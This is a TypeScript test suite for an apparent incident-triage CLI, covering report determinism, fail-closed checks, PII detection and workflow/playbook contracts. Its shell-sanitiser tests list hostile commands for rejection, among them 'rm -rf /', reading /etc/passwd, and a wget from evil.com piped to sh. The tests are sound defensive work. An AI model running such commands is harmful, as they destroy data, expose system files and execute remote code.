/**
 * Phase 4N28: Incident Triage Contract Tests
 *
 * Tests for the incident triage CLI:
 * - Deterministic output for same inputs
 * - Fail-closed behavior
 * - No PII in output
 * - Safe command generation
 * - Packet ZIP determinism
 *
 * @governance SEAL-COMPLIANT
 */

import * as assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import {
    INCIDENT_REPORT_SCHEMA,
    TOOL_VERSION,
    buildIncidentPacket,
    buildIncidentReport,
    containsPII,
    generateHtmlReport,
    generateMarkdownReport,
    sanitizeForShell,
    validateCommand,
    type IncidentReport,
} from '../src/incident-triage.js';
import { sha256 } from '../src/manifest.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ============================================================================
// Test Fixtures
// ============================================================================

const MOCK_TRIAGE_OPTS = {
  zipPath: '/test/mock-bundle.zip',
  outDir: '/test/output',
  policyFromIndex: undefined,
  strict: true,
  verifySignatures: false,
  emitPacket: false,
  emitHtml: true,
  verbose: false,
  json: false,
};

const MOCK_BUNDLE_VERIFY = {
  ok: true,
  manifestSha: 'a'.repeat(64),
  filesVerified: 5,
  errors: [],
};

const MOCK_CUSTODY_CHECK = {
  present: true,
  ok: true,
  errors: [],
};

const MOCK_INDEX_DATA = {
  runId: '12345',
  releaseTag: 'autonomy-incident/2026',
  incident: true,
  tpi: {
    ok: true,
    minApprovals: 2,
    approverLogins: ['alice', 'bob'],
  },
  breakGlass: {
    activated: true,
    ok: true,
    reason: 'emergency-fix',
    approvers: ['alice', 'bob', 'carol'],
    noAutomerge: true,
    allowedActions: ['merge'],
  },
  roleBinding: {
    ok: true,
    sourceHash: 'abc123',
    approverRoles: {
      security: ['alice'],
      cio: ['bob'],
    },
  },
  expectedSignaturePolicy: {
    issuer: 'https://token.actions.githubusercontent.com',
    identity: 'https://github.com/terrafusion/os/.github/workflows/autonomy.yml@refs/heads/main',
    repo: 'terrafusion/os',
    workflowPath: '.github/workflows/autonomy.yml',
    ref: 'refs/heads/main',
    sha: 'abc123def456',
  },
  signingMode: 'full' as const,
  records: [
    {
      status: 'applied',
      bundle: {
        name: 'test-bundle.zip',
        manifestSha256: 'a'.repeat(64),
        verify: { ok: true, strict: true },
      },
      applyProof: {
        planItemId: 'item-001',
        strategyId: 'remove-unused-import',
        finalCommitSha: 'abc123def456',
        rollbackCommand: 'git revert abc123def456',
      },
      retention: { tier: 'incident' },
    },
  ],
};

// ============================================================================
// Schema Contract Tests
// ============================================================================

describe('Phase 4N28: Incident Report Schema', () => {
  it('should have correct schema version', () => {
    assert.equal(INCIDENT_REPORT_SCHEMA, 'terrafusion.autonomy.incident.report.v1');
  });

  it('should have tool version', () => {
    assert.ok(TOOL_VERSION.length > 0, 'Tool version should be non-empty');
    assert.ok(TOOL_VERSION.includes('4N28'), 'Tool version should include phase number');
  });

  it('should produce valid report structure', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    // Schema and metadata
    assert.equal(report.schema, INCIDENT_REPORT_SCHEMA);
    assert.ok(report.generatedAt.length > 0);
    assert.equal(report.toolVersion, TOOL_VERSION);

    // Inputs
    assert.equal(report.inputs.bundleName, 'test-bundle.zip');
    assert.equal(typeof report.inputs.sealed, 'boolean');

    // Verification
    assert.ok('bundle' in report.verification);
    assert.ok('custody' in report.verification);
    assert.ok('signatures' in report.verification);

    // Governance
    assert.ok('tpi' in report.governance);
    assert.ok('breakGlass' in report.governance);
    assert.ok('roleBinding' in report.governance);

    // Actions and commands
    assert.ok(Array.isArray(report.recommendedActions));
    assert.ok('verifyBundle' in report.commands);
  });
});

// ============================================================================
// Determinism Contract Tests
// ============================================================================

describe('Phase 4N28: Report Determinism', () => {
  it('should produce identical JSON for same inputs (10x)', () => {
    // Build report 10 times with same inputs
    // We need to fix the generatedAt timestamp for true determinism
    const reports: IncidentReport[] = [];

    for (let i = 0; i < 10; i++) {
      const report = buildIncidentReport(
        MOCK_TRIAGE_OPTS,
        'test-bundle.zip',
        MOCK_BUNDLE_VERIFY,
        MOCK_CUSTODY_CHECK,
        MOCK_INDEX_DATA
      );
      // Normalize timestamp for comparison
      report.generatedAt = '2026-01-31T12:00:00.000Z';
      reports.push(report);
    }

    // All reports should be identical
    const json0 = JSON.stringify(reports[0], null, 2);
    for (let i = 1; i < 10; i++) {
      const jsonI = JSON.stringify(reports[i], null, 2);
      assert.equal(jsonI, json0, `Report ${i} should match report 0`);
    }
  });

  it('should produce identical Markdown for same inputs', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );
    report.generatedAt = '2026-01-31T12:00:00.000Z';

    const md1 = generateMarkdownReport(report);
    const md2 = generateMarkdownReport(report);

    assert.equal(md1, md2, 'Markdown should be deterministic');
  });

  it('should produce identical HTML for same inputs', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );
    report.generatedAt = '2026-01-31T12:00:00.000Z';

    const html1 = generateHtmlReport(report);
    const html2 = generateHtmlReport(report);

    assert.equal(html1, html2, 'HTML should be deterministic');
  });
});

// ============================================================================
// Fail-Closed Contract Tests
// ============================================================================

describe('Phase 4N28: Fail-Closed Behavior', () => {
  it('should report bundle verification failure', () => {
    const failedVerify = {
      ok: false,
      manifestSha: 'b'.repeat(64),
      filesVerified: 0,
      errors: ['Hash mismatch: apply-proof.json'],
    };

    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      failedVerify,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    assert.equal(report.verification.bundle.ok, false);
    assert.ok(report.verification.bundle.errors.length > 0);
  });

  it('should report custody verification failure', () => {
    const failedCustody = {
      present: true,
      ok: false,
      errors: ['Invalid custody schema'],
    };

    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      failedCustody,
      MOCK_INDEX_DATA
    );

    assert.equal(report.verification.custody.ok, false);
    assert.ok(report.verification.custody.errors.length > 0);
  });

  it('should detect missing signature pins', () => {
    const indexWithoutPins = { ...MOCK_INDEX_DATA };
    delete indexWithoutPins.expectedSignaturePolicy;

    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      indexWithoutPins
    );

    assert.equal(report.verification.bundle.pinningSummary.pinned, false);
  });

  it('should include INVESTIGATE action when bundle fails', () => {
    const failedVerify = {
      ok: false,
      manifestSha: '',
      filesVerified: 0,
      errors: ['Bundle corrupted'],
    };

    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      failedVerify,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    assert.ok(
      report.recommendedActions.includes('INVESTIGATE_BUNDLE_INTEGRITY'),
      'Should recommend investigating bundle integrity'
    );
  });
});

// ============================================================================
// Safe Command Generation Tests
// ============================================================================

describe('Phase 4N28: Safe Command Generation', () => {
  it('should sanitize shell metacharacters', () => {
    const dangerous = 'file; rm -rf /';
    const safe = sanitizeForShell(dangerous);

    assert.ok(!safe.includes(';'), 'Should remove semicolon');
    assert.ok(!safe.includes(' '), 'Should remove spaces');
    // Note: Forward slash is allowed (needed for file paths)
    assert.equal(safe, 'file-rm--rf-/');
  });

  it('should reject all forbidden characters', () => {
    const forbidden = [
      '&',
      '|',
      '`',
      '$',
      '(',
      ')',
      '{',
      '}',
      '[',
      ']',
      '<',
      '>',
      '!',
      "'",
      '"',
      '\\',
    ];

    for (const char of forbidden) {
      const input = `test${char}file`;
      const safe = sanitizeForShell(input);
      assert.ok(!safe.includes(char), `Should remove ${char}`);
    }
  });

  it('should validate clean commands', () => {
    const cleanCmd = 'pnpm perf:verify-bundle --zip test-bundle.zip --strict';
    assert.ok(validateCommand(cleanCmd), 'Clean command should validate');
  });

  it('should reject dangerous commands', () => {
    const dangerousCmds = [
      'rm -rf /',
      'echo $PATH',
      'cat /etc/passwd | grep root',
      'wget http://evil.com/script.sh && sh script.sh',
      'cmd; rm -rf /',
    ];

    for (const cmd of dangerousCmds) {
      assert.ok(!validateCommand(cmd), `Should reject: ${cmd}`);
    }
  });

  it('should produce verifyBundle command without forbidden chars', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    assert.ok(validateCommand(report.commands.verifyBundle), 'verifyBundle should be safe');
  });

  it('should produce safe rollback commands', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    if (report.commands.rollbackExecute) {
      assert.ok(validateCommand(report.commands.rollbackExecute), 'rollbackExecute should be safe');
    }
    if (report.commands.rollbackPreview) {
      assert.ok(validateCommand(report.commands.rollbackPreview), 'rollbackPreview should be safe');
    }
  });
});

// ============================================================================
// PII Detection Tests
// ============================================================================

describe('Phase 4N28: No PII in Output', () => {
  it('should detect PII field patterns', () => {
    const piiStrings = [
      'email',
      'password',
      'ssn',
      'social_security',
      'phone_number',
      'home_address',
      'credit_card',
      'date_of_birth',
      'dob',
      'driver_license',
    ];

    for (const pii of piiStrings) {
      assert.ok(containsPII(pii), `Should detect PII: ${pii}`);
    }
  });

  it('should allow non-PII fields', () => {
    const safes = ['runId', 'bundleName', 'manifestSha', 'strategyId', 'planItemId'];

    for (const safe of safes) {
      assert.ok(!containsPII(safe), `Should not flag: ${safe}`);
    }
  });

  it('should not include PII fields in report JSON', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    const json = JSON.stringify(report);

    // Check that no PII field names appear
    assert.ok(!containsPII(json), 'Report JSON should not contain PII field names');
  });

  it('should not include PII in Markdown', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    const md = generateMarkdownReport(report);
    assert.ok(!containsPII(md), 'Markdown should not contain PII field names');
  });
});

// ============================================================================
// Packet Bundler Tests
// ============================================================================

describe('Phase 4N28: Incident Packet Bundler', () => {
  it('should produce deterministic ZIP', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );
    report.generatedAt = '2026-01-31T12:00:00.000Z';

    const json = JSON.stringify(report, null, 2);
    const md = generateMarkdownReport(report);
    const html = generateHtmlReport(report);
    const indexBuf = Buffer.from('{"schema":"test"}', 'utf8');

    const zip1 = buildIncidentPacket(report, json, md, html, indexBuf);
    const zip2 = buildIncidentPacket(report, json, md, html, indexBuf);

    // ZIPs should be byte-identical
    assert.equal(sha256(zip1), sha256(zip2), 'Packet ZIPs should be deterministic');
  });

  it('should include all required files in packet', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    const json = JSON.stringify(report, null, 2);
    const md = generateMarkdownReport(report);
    const html = generateHtmlReport(report);

    const zipData = buildIncidentPacket(report, json, md, html, null);

    // ZIP should be non-empty
    assert.ok(zipData.length > 100, 'Packet should have content');

    // Check for ZIP signature
    assert.equal(zipData[0], 0x50, 'Should start with PK');
    assert.equal(zipData[1], 0x4b, 'Should start with PK');
  });
});

// ============================================================================
// Rollback Command Tests
// ============================================================================

describe('Phase 4N28: Rollback Command Handling', () => {
  it('should include rollbackCommand only when outcome is applied', () => {
    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      MOCK_INDEX_DATA
    );

    assert.ok(report.autonomyChange, 'Should have autonomyChange');
    assert.ok(report.autonomyChange?.rollbackCommand, 'Should have rollbackCommand');
    assert.ok(report.commands.rollbackExecute, 'Should have rollbackExecute command');
  });

  it('should not include rollbackCommand when outcome is noop', () => {
    const noopIndex = {
      ...MOCK_INDEX_DATA,
      records: [
        {
          ...MOCK_INDEX_DATA.records[0],
          status: 'noop',
          applyProof: undefined,
        },
      ],
    };

    const report = buildIncidentReport(
      MOCK_TRIAGE_OPTS,
      'test-bundle.zip',
      MOCK_BUNDLE_VERIFY,
      MOCK_CUSTODY_CHECK,
      noopIndex
    );

    assert.ok(!report.autonomyChange, 'Should not have autonomyChange for noop');
    assert.ok(!report.commands.rollbackExecute, 'Should not have rollbackExecute for noop');
  });
});

// ============================================================================
// Workflow Contract Tests
// ============================================================================

describe('Phase 4N28: Triage Workflow Contract', () => {
  const workflowPath = path.join(
    __dirname,
    '..',
    '..',
    '..',
    '..',
    '.github',
    'workflows',
    'autonomy-incident-triage.yml'
  );

  it('should exist in .github/workflows', () => {
    assert.ok(fs.existsSync(workflowPath), 'Triage workflow must exist');
  });

  it('should trigger on release published', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('release:'), 'Must trigger on release');
    assert.ok(content.includes('published'), 'Must trigger on published');
  });

  it('should support workflow_dispatch', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('workflow_dispatch:'), 'Must support manual dispatch');
    assert.ok(content.includes('release_tag'), 'Must accept release_tag input');
  });

  it('should have minimal permissions', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('contents: read'), 'Must have contents:read');
    assert.ok(content.includes('actions: read'), 'Must have actions:read');
  });

  it('should gate on incident releases only', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('autonomy-incident/'), 'Must filter for incident releases');
  });

  it('should run triage command', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(
      content.includes('pnpm run triage') || content.includes('perf:triage'),
      'Must run triage command'
    );
  });

  it('should upload artifacts', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('upload-artifact'), 'Must upload artifacts');
  });

  it('should generate job summary', () => {
    const content = fs.readFileSync(workflowPath, 'utf8');
    assert.ok(content.includes('GITHUB_STEP_SUMMARY'), 'Must generate job summary');
  });
});

// ============================================================================
// Playbook Contract Tests
// ============================================================================

describe('Phase 4N28: Incident Response Playbook', () => {
  const playbookPath = path.join(
    __dirname,
    '..',
    '..',
    '..',
    '..',
    'AUTONOMY_INCIDENT_RESPONSE_PLAYBOOK.md'
  );

  it('should exist at repository root', () => {
    assert.ok(fs.existsSync(playbookPath), 'Playbook must exist');
  });

  it('should contain core doctrine', () => {
    const content = fs.readFileSync(playbookPath, 'utf8');
    assert.ok(
      content.includes('Do Not Trust Labels') || content.includes('Trust Proofs'),
      'Must contain core doctrine'
    );
  });

  it('should have verify section', () => {
    const content = fs.readFileSync(playbookPath, 'utf8');
    assert.ok(content.includes('Verify'), 'Must have verify section');
    assert.ok(content.includes('perf:verify-bundle'), 'Must include verify command');
  });

  it('should have rollback section', () => {
    const content = fs.readFileSync(playbookPath, 'utf8');
    assert.ok(content.includes('Rollback'), 'Must have rollback section');
    assert.ok(content.includes('git revert'), 'Must include rollback command');
  });

  it('should have archive section', () => {
    const content = fs.readFileSync(playbookPath, 'utf8');
    assert.ok(content.includes('Archive'), 'Must have archive section');
    assert.ok(content.includes('7 year') || content.includes('incident'), 'Must mention retention');
  });

  it('should include checklist', () => {
    const content = fs.readFileSync(playbookPath, 'utf8');
    assert.ok(content.includes('[ ]') || content.includes('Checklist'), 'Must have checklist');
  });
});
